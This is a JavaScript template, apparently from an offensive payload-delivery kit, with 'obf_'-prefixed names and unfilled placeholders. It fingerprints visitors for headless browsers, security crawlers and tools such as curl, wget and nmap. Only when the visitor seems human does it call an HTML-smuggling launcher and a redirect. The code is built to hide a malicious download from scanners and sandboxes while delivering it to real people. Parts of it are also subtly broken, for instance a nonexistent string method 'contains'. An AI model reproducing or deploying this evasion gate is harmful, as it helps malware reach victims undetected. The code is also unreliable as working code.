const obf_HEADLESS  = 1;
const obf_HEADFUL   = 0;
const obf_UNDEFINED = -1;

var obf_testResults = {};
var obf_mouseEventCounter = 0;

/* This is a generic function that verify if the browswer is headless or not
 * @param name (string): name of the test (same as the id name for the row corresponding)
 *                         to the test in HTML)
 * @param testFunction (function): function that checks if the browser is headless or not
 *
 * OBS: the test function return 1 if it's headless, 0 if it's normal, or -1 if it's undefined
 *      and every test function calls a write result function to assign a brief description
 *      of the result
 */
async function obf_testBrowser(obf_name, obf_testFunction) {
  obf_countresult = await obf_testFunction();
  if (obf_countresult == obf_HEADLESS)
    obf_testResults[obf_name] = "obf_headless";
  else if (obf_countresult == obf_HEADFUL)
    obf_testResults[obf_name] = "obf_headful";
  else
    obf_testResults[obf_name] = "obf_undefined";
}

function obf_getNodeForEventListener() {
  if(document.body != null) return document.body;

  var obf_body = document.getElementsByTagName("body");

  if(obf_body == null || obf_body.length == 0) { 
    obf_body = document.getElementsByTagName("head");
  }
  else {
    return obf_body[0];
  }

  if(obf_body == null || obf_body.length == 0) {
    obf_body = document.getElementsByTagName("html");
  }
  else {
    return obf_body[0];
  }

  if(obf_body == null || obf_body.length == 0) {
      return null;
  }
  else {
    return obf_body[0];
  }
}

// Test for user agent
function obf_testUserAgent() {
  let obf_agent = navigator.userAgent.toLowerCase();

  var obf_keywords = [
    "Googlebot", "AdsBot-Google", "Mediapartners-Google", "Google Search Console", "Chrome-Lighthouse",
    "DuckDuckBot", "JobboerseBot", "woobot", "PingdomPageSpeed", "PagePeeker", "Refindbot", "HubSpot",
    "Yandex", "Investment Crawler", "BingPreview", "Bingbot", "Baiduspider", "Sogou", "SISTRIX",
    "facebookexternalhit", "Site-Shot", "wkhtmltoimage", "SMTBot", "PetalBot", "AhrefsBot", "avalex",
    "RyteBot", "SemrushBot", "Cookiebot", "Seekport Crawler", "Cocolyzebot", "Veoozbot", "YisouSpider",
    "Elisabot", "ev-crawler", "screeenly-bot", "Cincraw", "Applebot", "headline.com", "SeekportBot",
    "HeadlessChrome", "MSIE 5.0", "PhantomJS", "bot", "curl", "wget", "nmap",
  ];

  for(const obf_key of obf_keywords) { 
    if(obf_agent.contains(obf_key.toLowerCase())) {
      return true;
    }
  }

  return false;
}

// Test for app version (almost equal to user agent)
function obf_testAppVersion() {
  let obf_appVersion = navigator.appVersion;

  return /headless/i.test(obf_appVersion);
}

// Test for plugins
function obf_testPlugins() {
  let obf_length = navigator.plugins.length;

  return obf_length === 0 ? obf_UNDEFINED : obf_HEADFUL;
}

// Tests for plugins prototype
function obf_testPluginsPrototype() {
  let obf_correctPrototypes = PluginArray.prototype === navigator.plugins.__proto__;
  if (navigator.plugins.length > 0)
    obf_correctPrototypes &= Plugin.prototype === navigator.plugins[0].__proto__;

  return obf_correctPrototypes ? obf_HEADFUL : obf_HEADLESS;
}

// Test for mime type
function obf_testMime() {
  let obf_length = navigator.mimeTypes.length;

  return obf_length === 0 ? obf_UNDEFINED : obf_HEADFUL;
}

// Tests for mime types prototype
function obf_testMimePrototype() {
  let obf_correctPrototypes = MimeTypeArray.prototype === navigator.mimeTypes.__proto__;
  if (navigator.mimeTypes.length > 0)
    obf_correctPrototypes &= MimeType.prototype === navigator.mimeTypes[0].__proto__;

  return obf_correctPrototypes ? obf_HEADFUL : obf_HEADLESS;
}

// Test for languages
function obf_testLanguages() {
  let obf_language        = navigator.language;
  let obf_languagesLength = navigator.languages.length;

  if (!obf_language || obf_languagesLength === 0)
    return obf_HEADLESS;
  return obf_HEADFUL;
}

// Test for webdriver (headless browser has this flag true)
function obf_testWebdriver() {
  let obf_webdriver = navigator.webdriver;

  return obf_webdriver ? obf_HEADLESS : obf_HEADFUL;
}

// Test for time elapsed after alert(). If it's closed too fast (< 30ms), it means
// the browser is headless
/*
function obf_testTimeElapse() {
  let obf_start = Date.now();

  //alert("Press OK");

  let obf_elapse = Date.now() - obf_start;
  return obf_elapse < 30;
}
*/

/*
// Test for chrome element (specific for google chrome browser)
function obf_testChrome() {
  let obf_chrome = window.chrome;

  return obf_chrome ? obf_HEADFUL : obf_UNDEFINED;
}
*/

// Test for permission
async function obf_testPermission() {
  let obf_permissionStatus, obf_notificationPermission;

  if (!navigator.permissions) {
    return obf_UNDEFINED;
  }
  obf_permissionStatus       = await navigator.permissions.query({ name: "notifications" });
  obf_notificationPermission = Notification.permission;

  if (obf_notificationPermission === "denied" && obf_permissionStatus.state === "prompt")
    return obf_HEADLESS;
  return obf_HEADFUL;
}

// Test for devtools protocol
function obf_testDevtool() {
  const obf_any = /./;
  let obf_count = 0;
  let obf_oldToString = obf_any.toString;

  obf_any.toString = function() {
    obf_count++;
    return "any";
  }

  console.debug(obf_any);
  let obf_usingDevTools = obf_count > 1;
  obf_any.toString = obf_oldToString;
  return obf_usingDevTools ? obf_UNDEFINED : obf_HEADFUL;
}

function obf_randomString(obf_length) {
    var obf_result           = '';
    var obf_characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var obf_charactersLength = obf_characters.length;

    for ( var obf_i = 0; obf_i < obf_length; obf_i++ ) {
      obf_result += obf_characters.charAt(Math.floor(Math.random() * obf_charactersLength));
   }
   return obf_result;
}

// Test for broken image. 
// Headless will emulate fetching image no matter if it exists.
function obf_testImage() {
  try {
    var obf_body  = obf_getNodeForEventListener();
    var obf_image = document.createElement("img");

    if(obf_body != null) {
      obf_image.style = 'display: none';
      obf_image.src = obf_randomString(15) + ".png";
      obf_body.appendChild(obf_image);

      obf_image.onerror = function(){
        if(obf_image.width === 0 && obf_image.height === 0)
          return obf_HEADLESS;
        return obf_HEADFUL;
      }
    } else {
      return obf_UNDEFINED;
    }
  }catch{
    return obf_HEADFUL;
  }
}

// Test for outerHeight and outerWidth
function obf_testOuter() {
  let obf_outerHeight = window.outerHeight;
  let obf_outerWidth  = window.outerWidth;

  return (obf_outerHeight === 0 && obf_outerWidth === 0) ? obf_HEADLESS : obf_HEADFUL;
}

// Test for connection-rtt
function obf_testConnectionRtt() {
  let obf_connection    = navigator.connection;
  let obf_connectionRtt = obf_connection ? obf_connection.rtt : undefined;

  if (obf_connectionRtt === undefined) {
    return obf_UNDEFINED;
  } else {
    return obf_connectionRtt === 0 ? obf_HEADLESS : obf_HEADFUL;
  }
}

// Test for mouse event (we're going to analyze attributes movementX and movementY)
function obf_testMouseMove() {
  let obf_zeroMovement = true;

  window.addEventListener("mousemove", obf_mouseEvent);

  function obf_mouseEvent(obf_event) {
    obf_zeroMovement = obf_zeroMovement && (obf_event.movementX === 0 && obf_event.movementY === 0);

    // Analyze N mouse events until give result
    if (obf_mouseEventCounter >= <<<MOUSE_MOVE_EVENTS>>>) {
      window.removeEventListener("mousemove", obf_mouseEvent);

      obf_testResults['obf_mousemove'] = "obf_undefined";

      if (obf_zeroMovement) {
        obf_testResults['obf_mousemove'] = "obf_headless";
      }
      else {
        obf_testResults['obf_mousemove'] = "obf_headful";
      }
    }

    obf_mouseEventCounter++;
  }
}


function obf_runTests() {
  /*
   *  Here is where we execute all the tests specified above
   */
  const obf_tests = [
    { name: "User Agent",        id: "obf_useragent",        obf_testFunction: obf_testUserAgent        },
    { name: "App Version",       id: "obf_appversion",       obf_testFunction: obf_testAppVersion       },
//<<<MOUSEMOVE>>>//    { name: "Mouse Move",        id: "obf_mousemove",        obf_testFunction: obf_testMouseMove        },
    { name: "Plugins",           id: "obf_plugins",          obf_testFunction: obf_testPlugins          },
    { name: "Plugins Prototype", id: "obf_pluginsprototype", obf_testFunction: obf_testPluginsPrototype },
    { name: "Mime",              id: "obf_mime",             obf_testFunction: obf_testMime             },
    { name: "Mime Prototype",    id: "obf_mimeprototype",    obf_testFunction: obf_testMimePrototype    },
    { name: "Languages",         id: "obf_languages",        obf_testFunction: obf_testLanguages        },
    { name: "Webdriver",         id: "obf_webdriver",        obf_testFunction: obf_testWebdriver        },
  //{ name: "Time Elapse",       id: "obf_timeelapse",       obf_testFunction: obf_testTimeElapse       },
  //{ name: "Chrome",            id: "obf_chromeelement",    obf_testFunction: obf_testChrome           },
    { name: "Permission",        id: "obf_permission",       obf_testFunction: obf_testPermission       },
    { name: "Devtool Protocol",  id: "obf_devtool",          obf_testFunction: obf_testDevtool          },
    { name: "Broken Image",      id: "obf_image",            obf_testFunction: obf_testImage            },
    { name: "Outer dimensions",  id: "obf_outer",            obf_testFunction: obf_testOuter            },
    { name: "Connection Rtt",    id: "obf_connectionrtt",    obf_testFunction: obf_testConnectionRtt    },
  ];

  obf_tests.forEach(obf_test => {
    try {
      obf_testBrowser(obf_test.id, obf_test.obf_testFunction);
    }catch{
      obf_UNDEFINED;
    }
  });
}

function obf_entryPoint() {
  obf_runTests();

  setTimeout(function() {
    var obf_unsafe = false;
    var obf_headless = 0;
    var obf_undefined = 0;
    var obf_failed = '';
    for(var obf_key in obf_testResults) {
      //<<<MOUSEMOVE>>>//if(obf_key == "obf_mousemove") continue;
      if(obf_testResults[obf_key] == 'obf_headless') {
          obf_headless++;
          obf_failed += obf_key + ', ';
      }
      if(obf_testResults[obf_key] == 'obf_undefined') {
          obf_undefined++;
          obf_failed += obf_key + ', ';
      }
    }

    obf_result = obf_headless + obf_undefined;
    var obf_mouseMoved = obf_testResults['obf_mousemove'] == 'obf_headful';

    <<<TROUBLESHOOT_LOGIC>>>

    if((obf_result > <<<FAILED_TESTS_THRESHOLD>>>) || (obf_mouseEventCounter < <<<MOUSE_MOVE_EVENTS>>>)) {
      // UNSAFE ENVIRONMENT. Bailing out...
    }
    else {
      obf_launchHtmlSmuggling();
      <<<REDIRECT_STUB>>>
    }

  }, <<<DELAY>>>);
}